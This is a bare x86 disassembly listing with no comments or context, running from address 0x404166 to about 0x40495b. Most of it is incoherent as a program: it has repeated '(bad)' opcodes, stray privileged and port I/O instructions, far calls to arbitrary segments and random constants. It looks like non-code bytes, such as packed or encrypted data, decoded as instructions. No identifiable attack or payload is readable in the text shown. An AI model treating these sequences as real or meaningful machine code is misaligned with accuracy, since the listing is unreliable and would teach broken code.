  404166:	mov    ds:0x9ceb2db2,al
  40416b:	xor    al,BYTE PTR [ecx-0x274808eb]
  404171:	push   edi
  404172:	les    esp,FWORD PTR [edx+0x2251fa36]
  404178:	add    BYTE PTR [edx],0x18
  40417b:	push   edi
  40417c:	lahf   
  40417d:	inc    esi
  40417e:	test   BYTE PTR ds:[ecx-0x18],dh
  404182:	fwait
  404183:	arpl   WORD PTR [ecx+eax*1],sp
  404186:	fsub   st,st(1)
  404188:	sbb    al,0x8a
  40418a:	fldenv [edi+0x3dfbfba2]
  404190:	dec    eax
  404191:	out    0xe3,eax
  404193:	ja     0x40415e
  404195:	pop    es
  404196:	std    
  404197:	dec    esi
  404198:	or     BYTE PTR [edi+0x58],al
  40419b:	test   BYTE PTR [ecx-0x3a596e03],0x4b
  4041a2:	or     BYTE PTR [ebx-0x295052cd],bh
  4041a8:	push   ds
  4041a9:	push   ss
  4041aa:	dec    edx
  4041ab:	mov    dh,0x8
  4041ad:	stos   DWORD PTR es:[edi],eax
  4041ae:	out    0xfd,eax
  4041b0:	pop    ds
  4041b1:	ret    
  4041b2:	mul    dh
  4041b4:	mov    DWORD PTR [edx],0xb42039fc
  4041ba:	rcl    BYTE PTR [esi],cl
  4041bc:	mov    dl,0x2f
  4041be:	mov    ?,WORD PTR [eax+0x6b376366]
  4041c4:	mov    WORD PTR [ecx],ds
  4041c6:	aas    
  4041c7:	imul   esi,esi,0x6ce5af43
  4041cd:	sub    al,0xb2
  4041cf:	inc    esp
  4041d0:	push   ds
  4041d1:	jecxz  0x4041d5
  4041d3:	cmp    BYTE PTR [eax-0x3c1708],0xe2
  4041da:	ret    0x3b97
  4041dd:	shl    DWORD PTR [esi+eiz*8+0x23c3486f],0x5d
  4041e5:	adc    al,0xc2
  4041e7:	and    bl,BYTE PTR [esi-0x3d]
  4041ea:	int3   
  4041eb:	or     bh,BYTE PTR [esi-0x6d5a0288]
  4041f1:	enter  0xd04a,0x2e
  4041f5:	jecxz  0x4041a5
  4041f7:	test   al,0x61
  4041f9:	jno    0x4041c3
  4041fb:	mov    ebx,0xd15eeecd
  404200:	jg     0x40425f
  404202:	ret    0xdfcc
  404205:	push   edx
  404206:	pop    eax
  404207:	sbb    al,0xe0
  404209:	andnps xmm2,XMMWORD PTR [eax+0x16]
  40420d:	ins    BYTE PTR es:[edi],dx
  40420e:	std    
  40420f:	dec    ebp
  404210:	or     DWORD PTR [eax-0x3ba3b91e],0xffffffda
  404217:	lock sbb dh,BYTE PTR [ebp-0x627108ee]
  40421e:	test   DWORD PTR [edi],0x628944d9
  404224:	sub    DWORD PTR [esi-0x73],ebx
  404227:	icebp  
  404228:	inc    ebx
  404229:	jnp    0x404241
  40422b:	xchg   esi,eax
  40422c:	push   ss
  40422d:	mov    ah,0xaa
  40422f:	pusha  
  404230:	add    al,0x3f
  404232:	push   edx
  404233:	cli    
  404234:	sbb    BYTE PTR [ecx+0x27],ah
  404237:	pop    es
  404238:	jle    0x40427a
  40423a:	cmp    eax,0x40
  40423d:	mov    DWORD PTR ds:0x42fd6e,0x793d
  404247:	jmp    0x4045a7
  40424c:	leave  
  40424d:	daa    
  40424e:	rcl    BYTE PTR [esi],1
  404250:	repnz aad 0xf1
  404253:	jecxz  0x404232
  404255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404256:	dec    ebp
  404257:	movd   mm3,eax
  40425a:	fist   WORD PTR [edi+ecx*2+0x3d707018]
  404261:	jge    0x4042d3
  404263:	jo     0x4042a8
  404265:	xchg   esi,eax
  404266:	inc    esi
  404267:	push   0x1d
  404269:	mov    edi,0x4baaba0e
  40426e:	inc    ebp
  40426f:	pop    ss
  404270:	stos   DWORD PTR es:[edi],eax
  404271:	and    ebx,DWORD PTR [edx+0x3e]
  404274:	dec    ecx
  404275:	inc    DWORD PTR [ebp+0x23]
  404278:	or     DWORD PTR [ebx+ebx*1+0x17f3c3a0],ebp
  40427f:	add    BYTE PTR [ecx],dh
  404281:	ja     0x404255
  404283:	cwde   
  404284:	(bad)  
  404285:	and    eax,0xf44cf827
  40428a:	or     al,BYTE PTR [ebp+eax*8-0x23]
  40428e:	hlt    
  40428f:	nop
  404290:	jne    0x4042a6
  404292:	aam    0x82
  404294:	stc    
  404295:	outs   dx,BYTE PTR ds:[esi]
  404296:	mov    al,ds:0x1bd8db65
  40429b:	popf   
  40429c:	clc    
  40429d:	addr16 and al,0xcb
  4042a0:	pushf  
  4042a1:	pop    ss
  4042a2:	not    ch
  4042a4:	ror    ch,0xb7
  4042a7:	push   esp
  4042a8:	or     eax,0xd72a8410
  4042ad:	pop    ds
  4042ae:	outs   dx,BYTE PTR ds:[esi]
  4042af:	mov    ds:0xdd346f9c,eax
  4042b4:	rol    ebp,1
  4042b6:	or     bp,WORD PTR [edx+0x35d24a26]
  4042bd:	xlat   BYTE PTR ds:[ebx]
  4042be:	lods   eax,DWORD PTR ds:[esi]
  4042bf:	mov    ebp,0xc7a20ef9
  4042c4:	mov    bl,0xf2
  4042c6:	mov    ecx,0x404daa69
  4042cb:	push   ecx
  4042cc:	adc    al,0x0
  4042ce:	cmp    al,0x44
  4042d0:	mov    eax,ds:0x353b49a9
  4042d5:	mov    esi,0x732272de
  4042da:	out    dx,eax
  4042db:	xor    al,0xf3
  4042dd:	aaa    
  4042de:	jns    0x404334
  4042e0:	mov    edx,0x97dc4a9
  4042e5:	mov    dl,0x3d
  4042e7:	ins    BYTE PTR es:[edi],dx
  4042e8:	add    eax,0x93fecc47
  4042ed:	sbb    eax,0x1c70e9
  4042f2:	or     eax,0xb474123e
  4042f7:	sub    al,0xf2
  4042f9:	cmp    eax,0xa6f9721a
  4042fe:	pop    ebp
  4042ff:	mov    DWORD PTR [esp+eax*2+0x7c],esi
  404303:	mov    bl,0xb6
  404305:	mov    edi,esp
  404307:	push   esp
  404308:	rol    bh,1
  40430a:	cwde   
  40430b:	inc    eax
  40430c:	inc    edi
  40430d:	clc    
  40430e:	cli    
  40430f:	add    dl,0x92
  404312:	call   0xdc7e:0x4994279c
  404319:	add    BYTE PTR [ebx],ah
  40431b:	jecxz  0x404333
  40431d:	xchg   edx,eax
  40431e:	test   al,0x3e
  404320:	push   edi
  404321:	test   ecx,esp
  404323:	inc    esp
  404324:	mov    bl,0x39
  404326:	sahf   
  404327:	pop    ecx
  404328:	arpl   WORD PTR [ecx],si
  40432a:	xor    eax,0xa4ae5708
  40432f:	in     al,0x6b
  404331:	jecxz  0x4042f5
  404333:	(bad)  
  404334:	xchg   edi,eax
  404335:	shl    bl,cl
  404337:	xchg   edi,eax
  404338:	bound  edi,QWORD PTR [esi+0x1bd68688]
  40433e:	sub    BYTE PTR [esi+eax*2],ah
  404341:	in     al,dx
  404342:	test   al,0x32
  404344:	add    edx,DWORD PTR [eax+0x26517658]
  40434a:	in     eax,0x87
  40434c:	add    eax,0x884c9ec9
  404351:	jnp    0x40438d
  404353:	repnz sbb al,0x84
  404356:	sub    dh,BYTE PTR [esi+0x5925abc5]
  40435c:	xchg   esi,eax
  40435d:	leave  
  40435e:	addr16 out dx,eax
  404360:	or     ebp,DWORD PTR [edi]
  404362:	fbstp  TBYTE PTR [edi-0x6]
  404365:	xchg   ebx,eax
  404366:	mov    es,WORD PTR es:[esi-0x78109a6a]
  40436d:	addr16 aaa 
  40436f:	jnp    0x4043cb
  404371:	or     al,0x72
  404373:	movd   ebx,mm5
  404376:	xor    eax,esi
  404378:	mov    ecx,DWORD PTR [ecx]
  40437a:	dec    ebp
  40437b:	gs ds iret 
  40437e:	sbb    eax,0xcd209f4c
  404383:	(bad)  
  404384:	fcomp  QWORD PTR [ebx]
  404386:	adc    al,0x87
  404388:	push   ss
  404389:	inc    esi
  40438a:	out    0xd9,eax
  40438c:	cmp    DWORD PTR [ebp-0x53],ecx
  40438f:	adc    BYTE PTR [ecx+0x4f],dh
  404392:	xchg   ah,ch
  404394:	jp     0x40437a
  404396:	jo     0x4043db
  404398:	adc    eax,0xbbd27dc0
  40439d:	or     DWORD PTR [edx-0x78],ecx
  4043a0:	xor    DWORD PTR [edx],edi
  4043a2:	inc    ecx
  4043a3:	or     al,0x2e
  4043a5:	fidiv  DWORD PTR [edx]
  4043a7:	inc    esi
  4043a8:	mov    cl,bl
  4043aa:	xchg   BYTE PTR [esi+0x463bb1a1],cl
  4043b0:	data16 int3 
  4043b2:	push   edx
  4043b3:	sbb    eax,0xf25e671f
  4043b8:	out    0xa6,al
  4043ba:	inc    esp
  4043bb:	xchg   DWORD PTR [ebp-0x698afabe],ebx
  4043c1:	sub    esi,edi
  4043c3:	ds call 0xce1b:0xc908d71c
  4043cb:	mov    dh,0xa7
  4043cd:	jns    0x40441e
  4043cf:	mov    ds:0x38581818,eax
  4043d4:	jnp    0x40440b
  4043d6:	and    BYTE PTR [ebx],al
  4043d8:	jbe    0x4043e4
  4043da:	arpl   WORD PTR [bx+si-0x65ec],bx
  4043df:	inc    ecx
  4043e0:	xor    DWORD PTR es:[ebp+ebp*8-0x12],esp
  4043e5:	mov    bl,0xc3
  4043e7:	js     0x40443f
  4043e9:	xchg   ecx,eax
  4043ea:	inc    ebp
  4043eb:	repnz sbb esi,DWORD PTR [edx+edx*1-0x39]
  4043f0:	xchg   ebp,edi
  4043f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043f3:	in     al,0xc5
  4043f5:	jbe    0x404391
  4043f7:	ret    0xbb2c
  4043fa:	and    al,0xfe
  4043fc:	lahf   
  4043fd:	pop    esp
  4043fe:	cmp    esp,DWORD PTR [ecx-0x1a]
  404401:	aaa    
  404402:	xor    al,0x7a
  404404:	mov    BYTE PTR [edi+0x55],al
  404407:	xchg   edx,eax
  404408:	cmp    al,0xa8
  40440a:	adc    bh,ah
  40440c:	cmp    ebp,DWORD PTR [eax]
  40440e:	loop   0x40439b
  404410:	xchg   BYTE PTR [esi-0x544eda4a],dh
  404416:	and    al,0x80
  404418:	push   esi
  404419:	push   cs
  40441a:	adc    dh,BYTE PTR [ebp+0x5baa2e83]
  404420:	dec    edx
  404421:	lds    esp,FWORD PTR [edx]
  404423:	pop    ds
  404424:	shl    DWORD PTR [edx+esi*4+0x5e],cl
  404428:	sar    eax,1
  40442a:	xchg   ebx,eax
  40442b:	repnz rcr BYTE PTR [ecx],1
  40442e:	lods   eax,DWORD PTR ds:[esi]
  40442f:	loopne 0x4043dc
  404431:	out    0x56,eax
  404433:	push   es
  404434:	jmp    0xe9b9108f
  404439:	xchg   edx,eax
  40443a:	mov    WORD PTR [edx-0xc],es
  40443d:	pop    ebx
  40443e:	or     edx,DWORD PTR [ebx+0x5ebc5b79]
  404444:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404445:	pushf  
  404446:	pop    ds
  404447:	jge    0x404479
  404449:	rcl    BYTE PTR [edi+edx*8-0x3c383be1],1
  404450:	lods   al,BYTE PTR ds:[esi]
  404451:	ror    BYTE PTR [esi],1
  404453:	add    BYTE PTR ss:[ebp-0x65],bl
  404457:	or     dl,BYTE PTR [edi+0x50c838fe]
  40445d:	mov    BYTE PTR [eax],bl
  40445f:	clc    
  404460:	fdivr  st(1),st
  404462:	(bad)  
  404463:	mov    ?,eax
  404465:	xchg   ecx,eax
  404466:	add    DWORD PTR [ecx-0x302c6528],0xffffffa6
  40446d:	adc    bl,BYTE PTR [ebx-0x63]
  404470:	push   esp
  404471:	dec    esi
  404472:	xchg   ebp,ebp
  404474:	icebp  
  404475:	mov    ecx,0x5bde99f3
  40447a:	ror    BYTE PTR [edi+eiz*8+0x68],cl
  40447e:	arpl   WORD PTR [edi+edi*2-0x2cd1b020],bp
  404485:	mov    edi,0x9a463985
  40448a:	addr16 jb 0x404426
  40448d:	scas   al,BYTE PTR es:[edi]
  40448e:	mov    ah,0x4c
  404490:	icebp  
  404491:	push   cs
  404492:	lock or eax,0xe7977e7c
  404498:	ja     0x4044d3
  40449a:	rol    edx,cl
  40449c:	and    ebx,DWORD PTR [edi+0xa7402d4]
  4044a2:	push   0xf6ab738a
  4044a7:	dec    edx
  4044a8:	mov    esi,0x26d458ee
  4044ad:	fs inc eax
  4044af:	loopne 0x4044ea
  4044b1:	lahf   
  4044b2:	adc    ebp,esp
  4044b4:	call   0x539a3cea
  4044b9:	jno    0x404442
  4044bb:	dec    esi
  4044bc:	imul   esi,ecx,0x3c
  4044bf:	aad    0x76
  4044c1:	inc    ecx
  4044c2:	pop    ss
  4044c3:	adc    eax,edi
  4044c5:	xchg   esi,eax
  4044c6:	adc    DWORD PTR ds:0x619a9b19,0x9b8b87a4
  4044d0:	mov    ds:0xf9d7f73d,al
  4044d5:	xchg   ebp,eax
  4044d6:	or     BYTE PTR [esi+ecx*2+0x4eac77e5],0xf3
  4044de:	cdq    
  4044df:	rcr    DWORD PTR [eax],1
  4044e1:	mov    ecx,DWORD PTR [esi]
  4044e3:	sub    eax,esp
  4044e5:	cwde   
  4044e6:	and    ch,bh
  4044e8:	cmp    DWORD PTR [eax],esp
  4044ea:	mov    ah,0xc4
  4044ec:	jl     0x4044b5
  4044ee:	jp     0x40451b
  4044f0:	cld    
  4044f1:	ror    BYTE PTR [ecx],cl
  4044f3:	aam    0x6d
  4044f5:	stc    
  4044f6:	imul   edx,DWORD PTR [edi+0x74d327f3],0xffffffe2
  4044fd:	jnp    0x4044d4
  4044ff:	xor    ah,cl
  404501:	mov    ah,0x0
  404503:	pop    es
  404504:	fild   DWORD PTR [esi+0x56e4cb38]
  40450a:	adc    DWORD PTR [edx+eiz*4-0x77535c30],esi
  404511:	pusha  
  404512:	push   ebx
  404513:	jmp    0x404552
  404515:	nop
  404516:	mov    ?,WORD PTR [ebp-0x2a9eefe6]
  40451c:	mov    eax,ds:0x31d83793
  404521:	ins    BYTE PTR es:[edi],dx
  404522:	ficom  DWORD PTR [edi-0x80]
  404525:	pushf  
  404526:	sub    edi,DWORD PTR [ecx+0x2c]
  404529:	(bad)  
  40452a:	das    
  40452b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40452c:	bound  ebp,QWORD PTR [ecx-0x3f6d71bc]
  404532:	push   eax
  404533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404534:	mov    DWORD PTR [ecx+0x749c3c7e],eax
  40453a:	(bad)  
  40453b:	mov    dh,0xf7
  40453d:	pop    esi
  40453e:	mov    ds:0x84c0a86f,al
  404543:	jecxz  0x40455e
  404545:	or     DWORD PTR [ecx],ebp
  404547:	mov    edi,0x8d654a01
  40454c:	or     eax,0x1d412045
  404551:	pop    ss
  404552:	mov    bl,0x62
  404554:	fsub   DWORD PTR [ebp+0x20]
  404557:	ret    
  404558:	jb     0x4044e2
  40455a:	and    eax,0x929ba63a
  40455f:	sub    BYTE PTR [eax+0x55],ah
  404562:	paddd  mm5,QWORD PTR [di]
  404566:	test   ebp,0xc524eecb
  40456c:	addr16 jnp 0x404599
  40456f:	out    0x63,al
  404571:	aas    
  404572:	into   
  404573:	je     0x4045ec
  404575:	sbb    bh,BYTE PTR [eax]
  404577:	in     eax,0x7f
  404579:	jb     0x404573
  40457b:	clc    
  40457c:	or     eax,DWORD PTR [ebp-0x63]
  40457f:	ins    BYTE PTR es:[edi],dx
  404580:	fidiv  DWORD PTR [esi]
  404582:	out    dx,al
  404583:	scas   eax,DWORD PTR es:[edi]
  404584:	ret    0x6b96
  404587:	jae    0x4045c4
  404589:	daa    
  40458a:	shl    DWORD PTR [ecx],0x4d
  40458d:	jo     0x404529
  40458f:	pop    ecx
  404590:	int3   
  404591:	jge    0x404603
  404593:	out    dx,al
  404594:	cmc    
  404595:	retf   
  404596:	xor    DWORD PTR [ebx+0x59],ecx
  404599:	cs sti 
  40459b:	enter  0x481d,0x59
  40459f:	or     ecx,DWORD PTR [esi-0x4e]
  4045a2:	arpl   si,di
  4045a4:	shl    BYTE PTR [edx+0x11820fca],0xf9
  4045ab:	(bad)  
  4045ac:	jmp    DWORD PTR [ecx]
  4045ae:	adc    eax,0x42fd82
  4045b3:	mov    edx,DWORD PTR [ebp-0x8]
  4045b6:	jmp    0x404916
  4045bb:	push   ss
  4045bc:	jge    0x404620
  4045be:	add    BYTE PTR [ecx+0x73],dh
  4045c1:	jb     0x4045c8
  4045c3:	inc    edi
  4045c4:	sbb    ch,BYTE PTR [ecx+edx*2]
  4045c7:	pop    edx
  4045c8:	(bad)  
  4045c9:	push   esi
  4045ca:	cli    
  4045cb:	or     al,0x24
  4045cd:	jo     0x40463f
  4045cf:	cmp    eax,0x3b70707d
  4045d4:	xor    WORD PTR [ebx],bx
  4045d7:	retf   
  4045d8:	pop    edx
  4045d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045da:	mov    eax,0xfcd8581c
  4045df:	cmovnp esi,DWORD PTR [edi+0xc]
  4045e3:	das    
  4045e4:	pop    ecx
  4045e5:	xchg   esi,eax
  4045e6:	pushf  
  4045e7:	pop    ebp
  4045e8:	sub    edi,edi
  4045ea:	xchg   DWORD PTR [esi-0x3482c95d],esp
  4045f0:	xlat   BYTE PTR ds:[ebx]
  4045f1:	int3   
  4045f2:	call   0x6c07a4e5
  4045f7:	mov    al,0x2d
  4045f9:	jnp    0x40462e
  4045fb:	shl    BYTE PTR [edi+0x23],1
  4045fe:	add    al,0x67
  404600:	not    DWORD PTR [ebp+0x12]
  404603:	ret    0xca
  404606:	pop    edi
  404607:	push   esi
  404608:	imul   ebx,DWORD PTR [esi-0x67],0xaa41b84e
  40460f:	jmp    0x4045c4
  404611:	pop    ds
  404612:	jbe    0x40467d
  404614:	or     DWORD PTR [ecx-0x5e],eax
  404617:	and    edi,edx
  404619:	or     al,0xef
  40461b:	sub    esp,DWORD PTR [ebp-0x4e890088]
  404621:	mov    bh,BYTE PTR [ebx]
  404623:	or     BYTE PTR [ebx],bl
  404625:	add    al,BYTE PTR [ebp+0x55e18cb6]
  40462b:	out    dx,al
  40462c:	stc    
  40462d:	inc    ebx
  40462e:	pop    ss
  40462f:	imul   edi,DWORD PTR [eax],0x94bd0c1c
  404635:	push   eax
  404636:	jns    0x4045bf
  404638:	inc    ecx
  404639:	or     al,0x99
  40463b:	stos   BYTE PTR es:[edi],al
  40463c:	fisubr WORD PTR [ecx-0x695fc873]
  404642:	and    al,0x3f
  404644:	outs   dx,BYTE PTR ds:[esi]
  404645:	or     eax,0x86cd165
  40464a:	push   ebp
  40464b:	xor    DWORD PTR [esp+ecx*1-0x657e2834],edi
  404652:	sbb    BYTE PTR [esi+0x1f19e2e2],ah
  404658:	cmp    al,0xef
  40465a:	shl    DWORD PTR [edi+edx*4],cl
  40465d:	mov    ecx,DWORD PTR [ebp+0x778f9836]
  404663:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404664:	int    0x62
  404666:	jg     0x4046a0
  404668:	mov    ds:0x44480c8,al
  40466d:	arpl   WORD PTR [ebx+0x49],ax
  404670:	pusha  
  404671:	scas   eax,DWORD PTR es:[edi]
  404672:	push   ds
  404673:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404674:	in     eax,0x10
  404676:	inc    eax
  404677:	pop    ss
  404678:	cmp    edi,DWORD PTR [edi+0x324c8609]
  40467e:	xchg   ebp,eax
  40467f:	mov    al,0x7d
  404681:	mov    esp,0x482bf7b0
  404686:	xchg   edi,eax
  404687:	jne    0x404686
  404689:	xchg   esi,edx
  40468b:	xchg   ecx,ebp
  40468d:	pop    ss
  40468e:	ror    DWORD PTR [ecx-0x5984f401],cl
  404694:	xor    ecx,eax
  404696:	push   edi
  404697:	test   eax,0xc654bda5
  40469c:	cmp    eax,0xd239eda1
  4046a1:	(bad)  
  4046a2:	cld    
  4046a3:	repz into 
  4046a5:	jmp    0xb694:0x91fef718
  4046ac:	push   eax
  4046ad:	inc    BYTE PTR [esi+ebp*2-0x323d1275]
  4046b4:	pop    ds
  4046b5:	and    DWORD PTR [eax+0x1dcec2b0],0xffffffe3
  4046bc:	outs   dx,DWORD PTR ds:[esi]
  4046bd:	jns    0x404678
  4046bf:	(bad)  
  4046c0:	cli    
  4046c1:	mov    ds:0x5c408bd4,eax
  4046c6:	dec    esp
  4046c7:	inc    edx
  4046c8:	mov    esp,0xc940cb03
  4046cd:	jmp    0x4cf7bcd2
  4046d2:	sbb    al,0x22
  4046d4:	sbb    al,0x48
  4046d6:	cmc    
  4046d7:	mov    BYTE PTR [ecx+0x5c886b98],ch
  4046dd:	pop    esi
  4046de:	xchg   ecx,eax
  4046df:	in     eax,dx
  4046e0:	pop    ss
  4046e1:	or     al,dl
  4046e3:	xchg   esi,eax
  4046e4:	scas   eax,DWORD PTR es:[edi]
  4046e5:	fmul   DWORD PTR [ecx-0x18]
  4046e8:	and    BYTE PTR [esi],ah
  4046ea:	cmp    eax,0x34e93b60
  4046ef:	aad    0xea
  4046f1:	and    dh,BYTE PTR [esi]
  4046f3:	sbb    edx,ebx
  4046f5:	clc    
  4046f6:	lahf   
  4046f7:	inc    ebp
  4046f8:	rcr    cl,0x41
  4046fb:	jb     0x404743
  4046fd:	or     DWORD PTR ss:[ebx+0x67],ecx
  404701:	sub    eax,DWORD PTR [ebx]
  404703:	jnp    0x4046d9
  404705:	pop    edx
  404706:	pop    es
  404707:	jp     0x40468e
  404709:	xchg   edx,eax
  40470a:	mov    ah,0x6c
  40470c:	test   edx,0xfa85f873
  404712:	call   0xa5d2569f
  404717:	in     eax,0x7e
  404719:	sbb    al,0xea
  40471b:	test   eax,0x172378ef
  404720:	pop    ss
  404721:	stos   BYTE PTR es:[edi],al
  404722:	adc    al,0x76
  404724:	rcl    BYTE PTR ds:0xfdba3cd5,cl
  40472a:	dec    ecx
  40472b:	xor    bl,BYTE PTR [edi+esi*4-0x5c566f75]
  404732:	or     edx,DWORD PTR [eax]
  404734:	aad    0x74
  404736:	jno    0x404715
  404738:	jbe    0x40476e
  40473a:	xlat   BYTE PTR ds:[ebx]
  40473b:	aas    
  40473c:	pop    ebx
  40473d:	retf   0x5ab8
  404740:	xchg   ebp,eax
  404741:	inc    edi
  404742:	in     al,0x54
  404744:	jp     0x4046e4
  404746:	jns    0x404710
  404748:	cmp    BYTE PTR [ebx+0x53bb44b9],0x36
  40474f:	mov    dh,0x25
  404751:	std    
  404752:	aad    0xcf
  404754:	push   cs
  404755:	call   0x7579:0xad42943f
  40475c:	(bad)  
  40475d:	sti    
  40475e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40475f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404760:	loopne 0x40473e
  404762:	mov    eax,ds:0xa70c7d0e
  404767:	or     ebx,edx
  404769:	popa   
  40476a:	adc    dh,BYTE PTR [esi+0xf]
  40476d:	push   0xfffffff5
  40476f:	jnp    0x4047e1
  404771:	jnp    0x4047dd
  404773:	mov    eax,0x48cc7dc1
  404778:	sti    
  404779:	add    edx,DWORD PTR [ebx-0x74]
  40477c:	inc    esi
  40477d:	or     BYTE PTR [esi-0x16],al
  404780:	mov    DWORD PTR [ebx+edi*8+0x4f2bf779],esp
  404787:	into   
  404788:	mov    dl,0xa7
  40478a:	sub    al,0x70
  40478c:	fimul  DWORD PTR [eax+ebx*8]
  40478f:	xor    ah,dh
  404791:	push   ds
  404792:	pop    ds
  404793:	add    al,0x58
  404795:	jno    0x4047a7
  404797:	movsx  ecx,BYTE PTR [esi+0x1f]
  40479b:	test   al,0x48
  40479d:	inc    ebp
  40479e:	lods   eax,DWORD PTR ds:[esi]
  40479f:	in     eax,0x27
  4047a1:	xor    edx,DWORD PTR [ebx-0x6fe00aaf]
  4047a7:	cmp    BYTE PTR [edx],cl
  4047a9:	sub    DWORD PTR [esi+0x6fbeccbf],eax
  4047af:	imul   esi,esi,0xffffffc2
  4047b2:	mov    al,0x21
  4047b4:	push   ss
  4047b5:	mov    bh,0xcc
  4047b7:	test   DWORD PTR [ecx],ebp
  4047b9:	push   esi
  4047ba:	xor    eax,0xba3cd188
  4047bf:	shl    ah,cl
  4047c1:	dec    esp
  4047c2:	inc    eax
  4047c3:	arpl   WORD PTR [esi],bp
  4047c5:	fldcw  WORD PTR [edi]
  4047c7:	cmp    dh,ch
  4047c9:	in     al,dx
  4047ca:	lds    esp,FWORD PTR [esi+0x5b5a5598]
  4047d0:	mov    edx,0x34fe45e9
  4047d5:	or     al,0xd0
  4047d7:	xor    esi,edi
  4047d9:	fdiv   DWORD PTR [eax-0x67f85186]
  4047df:	push   es
  4047e0:	shl    DWORD PTR [edx+0x3e],1
  4047e3:	jmp    0x4047b0
  4047e5:	dec    BYTE PTR [ecx+0x14]
  4047e8:	cmp    BYTE PTR [ebx],ch
  4047ea:	jp     0x4047d8
  4047ec:	sbb    eax,0xf3ced978
  4047f1:	adc    ecx,ebx
  4047f3:	pop    ecx
  4047f4:	sub    DWORD PTR [edi+ebp*1+0x2f717ba4],ecx
  4047fb:	xchg   DWORD PTR ds:0x252c766b,esi
  404801:	les    esi,FWORD PTR [ecx+0x32]
  404804:	mov    ds,WORD PTR [eax]
  404806:	cli    
  404807:	jecxz  0x404794
  404809:	aas    
  40480a:	aam    0x6c
  40480c:	push   eax
  40480d:	ret    0xbc6b
  404810:	cli    
  404811:	scas   eax,DWORD PTR es:[di]
  404813:	call   0x24e209e7
  404818:	xchg   edi,eax
  404819:	sbb    ebp,DWORD PTR [eax+0x3219f23]
  40481f:	mov    ch,cl
  404821:	test   dh,ah
  404823:	fnstenv [ebp+0x5c]
  404826:	xchg   esi,ebx
  404828:	mov    eax,eax
  40482a:	(bad)  
  40482c:	(bad)  
  40482d:	loop   0x40481c
  40482f:	jmp    0x4047cb
  404831:	or     bh,dh
  404833:	or     al,BYTE PTR [edi]
  404835:	ret    
  404836:	inc    edi
  404837:	and    al,0xe8
  404839:	(bad)  
  40483a:	jno    0x404860
  40483c:	nop
  40483d:	outs   dx,BYTE PTR ds:[esi]
  40483e:	inc    ebp
  40483f:	push   ss
  404840:	mov    ds:0x8a2b59c3,al
  404845:	test   al,0x8d
  404847:	xor    al,0x75
  404849:	push   0xcdc2b539
  40484e:	pop    esi
  40484f:	test   DWORD PTR [edi+ebx*2],esi
  404852:	pop    edi
  404853:	mov    al,0x80
  404855:	mov    bl,0xf7
  404857:	and    DWORD PTR [edx+eax*1],eax
  40485a:	mov    ecx,0x9180f2a3
  40485f:	ret    0xa6b3
  404862:	repz sar DWORD PTR [esi-0x4d95559a],1
  404869:	aas    
  40486a:	loope  0x40481a
  40486c:	frstor cs:[eax+0x34f557d3]
  404873:	mov    ?,eax
  404875:	pop    edi
  404876:	pop    ss
  404877:	lods   eax,DWORD PTR ds:[esi]
  404878:	pushf  
  404879:	shr    DWORD PTR [ecx-0x35],1
  40487c:	mov    ah,0x4c
  40487e:	outs   dx,DWORD PTR ds:[esi]
  40487f:	test   eax,0x3cbc4230
  404884:	push   edx
  404885:	pusha  
  404886:	sub    bh,cl
  404888:	into   
  404889:	push   0xebe28172
  40488e:	jg     0x404890
  404890:	loope  0x4048c7
  404892:	stos   DWORD PTR es:[edi],eax
  404893:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404894:	adc    eax,0x139b0aaa
  404899:	sbb    DWORD PTR [ebp+0x11],0xffffff98
  40489d:	aas    
  40489e:	aaa    
  40489f:	xor    eax,ebx
  4048a1:	fsub   QWORD PTR [edx+0x50]
  4048a4:	push   edx
  4048a5:	out    0x27,eax
  4048a7:	cdq    
  4048a8:	sbb    al,0xc8
  4048aa:	sub    ebp,esi
  4048ac:	rcl    BYTE PTR [ebp+0x50],cl
  4048af:	aam    0xce
  4048b1:	mov    al,0xa
  4048b3:	mov    al,ds:0xcbcef605
  4048b8:	mov    cl,0x97
  4048ba:	retf   
  4048bb:	jle    0x40486c
  4048bd:	mov    DWORD PTR [ebp+edi*1+0x1d1e7321],esp
  4048c4:	not    BYTE PTR [ecx+0x7676c037]
  4048ca:	loopne 0x40490a
  4048cc:	lahf   
  4048cd:	fdiv   DWORD PTR es:[esi-0x5e5e107b]
  4048d4:	aas    
  4048d5:	mov    ah,0x25
  4048d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048d8:	daa    
  4048d9:	cmp    BYTE PTR [esi],cl
  4048db:	mov    ds:0xc0a0a03d,eax
  4048e0:	xchg   BYTE PTR [ebx],dl
  4048e2:	mov    ds:0x16e098e6,al
  4048e7:	ficomp WORD PTR [eax-0x500d3a6a]
  4048ed:	icebp  
  4048ee:	dec    DWORD PTR [ebx+edx*1]
  4048f1:	pop    esp
  4048f2:	cwde   
  4048f3:	out    dx,al
  4048f4:	pop    ds
  4048f5:	jg     0x40487e
  4048f7:	aad    0x49
  4048f9:	pusha  
  4048fa:	ds mov dl,bl
  4048fd:	add    BYTE PTR [ecx+esi*4],dl
  404900:	fsubr  st(1),st
  404902:	dec    ebx
  404903:	retf   
  404904:	mov    esi,DWORD PTR [esi-0x4141915b]
  40490a:	jno    0x404896
  40490c:	pop    edi
  40490d:	adc    al,0x2b
  40490f:	mov    eax,0x1a119332
  404914:	xchg   ebx,eax
  404915:	jg     0x4048a2
  404917:	inc    ebp
  404918:	hlt    
  404919:	xor    edx,ecx
  40491b:	add    edx,esi
  40491d:	cmp    edx,eax
  40491f:	mov    DWORD PTR ds:0x42e11c,0x6f80
  404929:	je     0x405095
  40492f:	add    DWORD PTR ds:0x42e124,ecx
  404935:	push   ebx
  404936:	adc    DWORD PTR ds:0x42e6ff,ecx
  40493c:	push   edi
  40493d:	mov    edi,DWORD PTR [ebp+0x8]
  404940:	mov    eax,0x8a3e
  404945:	and    DWORD PTR ds:0x42e134,0x5964
  40494f:	xor    ax,WORD PTR [edi+edx*4+0x2]
  404954:	mov    edi,0x3b04
  404959:	add    ax,di
